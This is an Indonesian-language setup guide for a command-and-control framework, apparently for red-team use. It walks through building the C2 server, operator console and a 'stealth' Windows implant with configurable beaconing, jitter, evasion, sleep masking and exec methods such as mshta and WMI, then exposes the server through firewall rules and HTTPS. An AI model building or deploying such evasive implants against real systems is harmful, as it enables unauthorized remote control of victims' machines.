# 02 — Setup & Instalasi

## Prasyarat

| Kebutuhan | Versi | Keterangan |
|---|---|---|
| Go | 1.21+ | Build semua binary |
| Make | — | Jalankan Makefile |
| Git | — | Clone repo |
| `garble` | latest | Opsional — obfuskasi binary |
| `donut` | latest | Opsional — konversi EXE ke shellcode |
| Server Linux | Ubuntu 22.04+ | Untuk C2 server production |

---

## 1. Clone dan Build

```bash
# Clone repository
git clone <repo-url> taburtuaiC2
cd taburtuaiC2

# Download dependensi Go
go mod download && go mod tidy

# Build semua binary
make all
```

Output di `bin/`:
```
bin/
├── server          ← C2 server
├── operator        ← Operator CLI
└── generate        ← Implant builder
```

### Build Individual

```bash
make server    # hanya build server
make operator  # hanya build operator
make generate  # hanya build generator
```

---

## 2. Build Agent

Agent dikompilasi dengan konfigurasi yang di-bake ke binary via `-ldflags`. Konfigurasi
ini tidak bisa diubah setelah compile.

### Stealth Build (Untuk Engagement)

```bash
make agent-win-stealth \
  C2_SERVER=http://172.23.0.118:8000 \
  ENC_KEY=GantiDenganKeyRahasia \
  INTERVAL=60 \
  JITTER=30 \
  KILL_DATE=2026-12-31
```

Output: `bin/agent_windows_stealth.exe`

### Debug Build (Untuk Testing Lokal)

```bash
make agent-win-debug \
  C2_SERVER=http://127.0.0.1:8080 \
  ENC_KEY=SpookyOrcaC2AES1
```

### Parameter Build Agent

| Parameter Make | Variabel Agent | Fungsi |
|---|---|---|
| `C2_SERVER` | `serverURL` | URL C2 server lengkap |
| `ENC_KEY` | `encKey` | AES-256-GCM key (wajib sama dengan server) |
| `INTERVAL` | `defaultInterval` | Detik antar beacon (default: 30) |
| `JITTER` | `defaultJitter` | % variasi interval (default: 20) |
| `KILL_DATE` | `defaultKillDate` | YYYY-MM-DD, kosong = tidak ada kill date |
| `EXEC_METHOD` | `defaultExecMethod` | `cmd`, `powershell`, `wmi`, `mshta` |
| `ENABLE_EVASION` | `defaultEnableEvasion` | `true`/`false` |
| `SLEEP_MASKING` | `defaultSleepMasking` | `true`/`false` |

> **Penting:** `ENC_KEY` harus **identik** dengan `ENCRYPTION_KEY` yang diset di server.
> Kalau beda, agent tidak bisa decrypt perintah dari server.

---

## 3. Setup Server C2

### Jalankan Server

```bash
# Cara dasar
ENCRYPTION_KEY=GantiDenganKeyRahasia ./bin/server --port 8000

# Dengan semua opsi
ENCRYPTION_KEY=GantiDenganKeyRahasia \
  ./bin/server \
  --port 8000 \
  --db data/taburtuai.db \
  --log-level info
```

### Menggunakan Screen/Tmux (Agar Tidak Mati saat Terminal Ditutup)

```bash
# Menggunakan screen
screen -S taburtuai-c2
ENCRYPTION_KEY=GantiDenganKeyRahasia ./bin/server --port 8000
# Ctrl+A, D untuk detach — server tetap jalan

# Reconnect
screen -r taburtuai-c2
```

```bash
# Menggunakan tmux
tmux new -s c2
ENCRYPTION_KEY=GantiDenganKeyRahasia ./bin/server --port 8000
# Ctrl+B, D untuk detach

# Reconnect
tmux attach -t c2
```

### Verifikasi Server Berjalan

```bash
curl http://127.0.0.1:8000/api/v1/health
# Respon: {"success":true,"message":"OK"}
```

---

## 4. Konfigurasi Firewall Server

Pastikan port server terbuka di firewall VPS:

```bash
# Ubuntu dengan UFW
sudo ufw allow 8000/tcp
sudo ufw reload

# CentOS/RHEL dengan firewalld
sudo firewall-cmd --add-port=8000/tcp --permanent
sudo firewall-cmd --reload

# Atau langsung dengan iptables
sudo iptables -A INPUT -p tcp --dport 8000 -j ACCEPT
```

---

## 5. Setup dengan HTTPS (Rekomendasi Production)

Gunakan Caddy sebagai reverse proxy — otomatis dapat sertifikat TLS dari Let's Encrypt:

```bash
# Install Caddy
curl -1sLf 'https://dl.cloudsmith.io/public/caddy/stable/gpg.key' | sudo gpg --dearmor -o /usr/share/keyrings/caddy-stable-archive-keyring.gpg
curl -1sLf 'https://dl.cloudsmith.io/public/caddy/stable/debian.deb.txt' | sudo tee /etc/apt/sources.list.d/caddy-stable.list
sudo apt update && sudo apt install caddy
```

`/etc/caddy/Caddyfile`:
```
c2.yourdomain.com {
    reverse_proxy localhost:8000
}
```

```bash
sudo systemctl enable --now caddy
```

Agent dikompilasi dengan `C2_SERVER=https://c2.yourdomain.com`.

---

## 6. Verifikasi End-to-End

Setelah server jalan, test komunikasi:

```bash
# Di server — cek health
curl http://localhost:8000/api/v1/health

# Di mesin operator — cek bisa akses dari luar
curl http://SERVER_IP:8000/api/v1/health

# Jalankan operator console
./bin/operator console --server http://SERVER_IP:8000

# Di dalam console, cek koneksi
taburtuai(SERVER_IP:8000) › stats
```

---

## 7. Struktur Direktori Penting

```
taburtuaiC2/
├── bin/                    ← Binary hasil build
├── cmd/
│   ├── server/             ← Source C2 server
│   ├── operator/           ← Source operator CLI
│   ├── generate/           ← Source implant builder
│   └── stager/             ← Source binary stager minimal
├── agent/                  ← Source agent (Windows/Linux/macOS)
├── internal/               ← Library shared (storage, API, types)
├── data/                   ← SQLite database (auto-created)
├── logs/                   ← Log files
├── wiki/                   ← Dokumentasi (ini)
└── Makefile                ← Build system
```

---

## 8. Environment Variables

| Variabel | Komponen | Keterangan |
|---|---|---|
| `ENCRYPTION_KEY` | Server | Kunci enkripsi AES-256-GCM, wajib diset |
| `TABURTUAI_SERVER` | Operator CLI | Default server URL (pengganti `--server`) |
| `TABURTUAI_API_KEY` | Operator CLI | API key (pengganti `--api-key`) |

```bash
# Set agar tidak perlu flag --server setiap kali
export TABURTUAI_SERVER=http://172.23.0.118:8000

# Setelah itu bisa langsung
./bin/operator console
./bin/operator agents list
```

---

**Selanjutnya:** [03 — Quickstart](03-quickstart.md)
